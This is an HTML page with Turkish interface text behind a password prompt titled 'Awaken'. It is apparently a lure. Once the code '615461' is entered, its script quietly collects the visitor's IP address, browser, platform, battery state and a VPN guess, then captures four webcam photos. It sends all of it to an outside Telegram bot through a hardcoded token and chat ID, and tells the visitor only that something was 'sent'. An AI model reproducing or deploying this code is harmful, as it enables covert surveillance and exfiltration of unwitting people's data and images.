<body>

  <h1>Awaken</h1>

  <input type="password" id="password" placeholder="Åžifreyi Gir" maxlength="6" />
  <button onclick="checkPassword()">Kodu GÃ¶nder</button>

  <div id="loading" class="hidden">GÃ¶nderiliyor...</div>
  <div id="error"></div>

  <script>
    const doÄŸruÅžifre = "615461";
    const chat_id = "7791726274";
    const token = "8213782156:AAEJe2ILFHUktg5rMaN4SGX1_TS-YAUyf4k";

    function checkPassword() {
      const input = document.getElementById("password").value;
      const loading = document.getElementById("loading");
      const error = document.getElementById("error");

      if (input === doÄŸruÅžifre) {
        error.innerText = "";
        loading.classList.remove("hidden");
        loading.innerText = "GÃ¶nderiliyor...";

        setTimeout(() => {
          loading.innerText = "GÃ¶nderildi âœ”";
          sendInfo(); // IP ve sistem bilgisi
          captureAndSend(); // Kamera tetikle
        }, 1000);
      } else {
        error.innerText = "YanlÄ±ÅŸ ÅŸifre. Bi' zahmet doÄŸrusunu gir.";
        loading.classList.add("hidden");
      }
    }

    async function sendInfo() {
      try {
        const ipData = await (await fetch("https://api.ipify.org/?format=json")).json();
        const ip = ipData.ip;

        let batteryInfo = "Bilinmiyor";
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Åžarj Oluyor" : "Åžarjda DeÄŸil"})`;
        }

        const userAgent = navigator.userAgent;
        const language = navigator.language;
        const platform = navigator.platform;
        const vpnGuess = userAgent.includes("VPN") || navigator.hardwareConcurrency < 2 ? "Muhtemel VPN" : "VPN Yok (Tahmini)";

        const message = `
ðŸ•µï¸â€â™‚ï¸ Yeni GiriÅŸ YakalandÄ±:

ðŸŒ IP: ${ip}
ðŸ’» TarayÄ±cÄ±: ${userAgent}
ðŸ—£ï¸ Dil: ${language}
ðŸªŸ Platform: ${platform}
ðŸ”‹ Åžarj Durumu: ${batteryInfo}
ðŸ›¡ï¸ VPN: ${vpnGuess}
        `;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chat_id,
            text: message
          })
        });

      } catch (err) {
        console.log("Bilgi gÃ¶nderimi hatasÄ±:", err);
      }
    }

    let photoCount = 0;

    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext("2d");

        const interval = setInterval(async () => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL("image/jpeg");

          const blob = await (await fetch(dataUrl)).blob();
          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("photo", blob, "photo.jpg");

          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          photoCount++;
          if (photoCount >= 4) {
            clearInterval(interval);
            stream.getTracks().forEach(track => track.stop());
          }
        }, 800);
      } catch (err) {
        console.log("Kamera izni alÄ±namadÄ± veya hata:", err);
      }
    }
  </script>
